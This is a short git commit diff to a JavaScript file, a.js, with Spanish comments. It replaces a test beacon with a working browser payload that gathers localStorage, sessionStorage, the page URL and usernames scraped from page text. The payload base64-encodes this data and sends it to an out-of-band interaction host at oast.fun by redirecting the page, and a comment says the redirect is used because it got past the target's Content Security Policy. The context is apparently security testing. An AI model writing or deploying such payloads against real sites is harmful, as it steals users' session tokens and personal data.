8774894ed2e9098aab09cc12969bd851e3d06d71
Hynpbus <iancruzh@gmail.com>
2026-03-28 00:15:12 -0400

    MODIFIED 1

--- a.js
+++ a.js
@@ -1,2 +1,13 @@
-// Esto envía el dato por debajo de la mesa (background)
-fetch("https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/log?data=" + btoa("PruebaInvisible"));
+// Recolectamos todo lo que no sea una cookie protegida
+let info = {
+    local: localStorage,
+    session: sessionStorage,
+    url: document.URL,
+    user: document.body.innerText.match(/Usuario: .*/g) // Intenta buscar nombres de usuario en el texto
+};
+
+// Lo convertimos a Base64
+let encodedData = btoa(JSON.stringify(info));
+
+// Usamos document.location porque es lo único que saltó tu CSP
+window.location = "https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/exfil?d=" + encodedData;
